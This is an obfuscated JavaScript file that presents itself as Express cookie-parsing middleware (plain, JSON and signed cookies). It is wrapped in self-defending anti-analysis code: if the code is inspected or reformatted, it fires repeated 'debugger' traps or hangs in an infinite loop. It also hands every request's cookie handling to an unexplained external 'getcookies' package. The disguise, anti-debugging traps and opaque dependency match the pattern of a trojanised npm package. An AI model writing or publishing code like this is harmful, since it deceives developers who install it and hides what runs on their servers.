var _0x50bb55 = (function () {
    var _0x46b946 = !![];
    return function (_0x102c49, _0x16492f) {
        var _0x4f00d5 = _0x46b946 ? function () {
            if (_0x16492f) {
                var _0x40ec33 = _0x16492f['apply'](_0x102c49, arguments);
                _0x16492f = null;
                return _0x40ec33;
            }
        } : function () {
        };
        _0x46b946 = ![];
        return _0x4f00d5;
    };
}());
(function () {
    _0x50bb55(this, function () {
        var _0x4a9957 = new RegExp('function\x20*\x5c(\x20*\x5c)');
        var _0x3ba9ab = new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i');
        var _0x443758 = _0x3a3deb('init');
        if (!_0x4a9957['test'](_0x443758 + 'chain') || !_0x3ba9ab['test'](_0x443758 + 'input')) {
            _0x443758('0');
        } else {
            _0x3a3deb();
        }
    })();
}());
'use strict';
var getcookies = require('getcookies');
var signature = require('cookie-signature');
module['exports'] = expressCookies;
module['exports']['JSONCookie'] = JSONCookie;
module['exports']['JSONCookies'] = JSONCookies;
module['exports']['signedCookie'] = signedCookie;
module['exports']['signedCookies'] = signedCookies;
function expressCookies(_0x45227d, _0x4920fc) {
    return function _0x45852a(_0x1444f2, _0x591999, _0x1e213e) {
        if (_0x1444f2['cookies']) {
            return _0x1e213e();
        }
        var _0x4d984d = _0x1444f2['headers']['cookie'];
        var _0x34826d = !_0x45227d || Array['isArray'](_0x45227d) ? _0x45227d || [] : [_0x45227d];
        _0x1444f2['secret'] = _0x34826d[0x0];
        _0x1444f2['cookies'] = Object['create'](null);
        _0x1444f2['signedCookies'] = Object['create'](null);
        getcookies(_0x1444f2, _0x591999, _0x19a8d8 => {
            if (_0x19a8d8) {
                return _0x1e213e(_0x19a8d8);
            }
            if (_0x34826d['length'] !== 0x0) {
                _0x1444f2['signedCookies'] = signedCookies(_0x1444f2['cookies'], _0x34826d);
                _0x1444f2['signedCookies'] = JSONCookies(_0x1444f2['signedCookies']);
            }
            _0x1444f2['cookies'] = JSONCookies(_0x1444f2['cookies']);
            _0x1e213e();
        });
    };
}
function JSONCookie(_0x4af488) {
    if (typeof _0x4af488 !== 'string' || _0x4af488['substr'](0x0, 0x2) !== 'j:') {
        return undefined;
    }
    try {
        return JSON['parse'](_0x4af488['slice'](0x2));
    } catch (_0x2074ae) {
        return undefined;
    }
}
function JSONCookies(_0x4dc272) {
    var _0xd775a1 = Object['keys'](_0x4dc272);
    var _0x344676;
    var _0x7180b5;
    for (var _0x3e1273 = 0x0; _0x3e1273 < _0xd775a1['length']; _0x3e1273++) {
        _0x344676 = _0xd775a1[_0x3e1273];
        _0x7180b5 = JSONCookie(_0x4dc272[_0x344676]);
        if (_0x7180b5) {
            _0x4dc272[_0x344676] = _0x7180b5;
        }
    }
    return _0x4dc272;
}
function signedCookie(_0x5db80d, _0x571517) {
    if (typeof _0x5db80d !== 'string') {
        return undefined;
    }
    if (_0x5db80d['substr'](0x0, 0x2) !== 's:') {
        return _0x5db80d;
    }
    var _0x38de5d = !_0x571517 || Array['isArray'](_0x571517) ? _0x571517 || [] : [_0x571517];
    for (var _0x2cdcfa = 0x0; _0x2cdcfa < _0x38de5d['length']; _0x2cdcfa++) {
        var _0x2acbc6 = signature['unsign'](_0x5db80d['slice'](0x2), _0x38de5d[_0x2cdcfa]);
        if (_0x2acbc6 !== ![]) {
            return _0x2acbc6;
        }
    }
    return ![];
}
function signedCookies(_0x1645a5, _0x4e7ba8) {
    var _0x510431 = Object['keys'](_0x1645a5);
    var _0x452c7a;
    var _0x24dcbc;
    var _0x253b6d = Object['create'](null);
    var _0x5e50fc;
    for (var _0x15c213 = 0x0; _0x15c213 < _0x510431['length']; _0x15c213++) {
        _0x24dcbc = _0x510431[_0x15c213];
        _0x5e50fc = _0x1645a5[_0x24dcbc];
        _0x452c7a = signedCookie(_0x5e50fc, _0x4e7ba8);
        if (_0x5e50fc !== _0x452c7a) {
            _0x253b6d[_0x24dcbc] = _0x452c7a;
            delete _0x1645a5[_0x24dcbc];
        }
    }
    return _0x253b6d;
}
function _0x3a3deb(_0x3b9879) {
    function _0x290a61(_0x44375d) {
        if (typeof _0x44375d === 'string') {
            return function (_0x167f7a) {
            }['constructor']('while\x20(true)\x20{}')['apply']('counter');
        } else {
            if (('' + _0x44375d / _0x44375d)['length'] !== 0x1 || _0x44375d % 0x14 === 0x0) {
                (function () {
                    return !![];
                }['constructor']('debu' + 'gger')['call']('action'));
            } else {
                (function () {
                    return ![];
                }['constructor']('debu' + 'gger')['apply']('stateObject'));
            }
        }
        _0x290a61(++_0x44375d);
    }
    try {
        if (_0x3b9879) {
            return _0x290a61;
        } else {
            _0x290a61(0x0);
        }
    } catch (_0x391566) {
    }
}
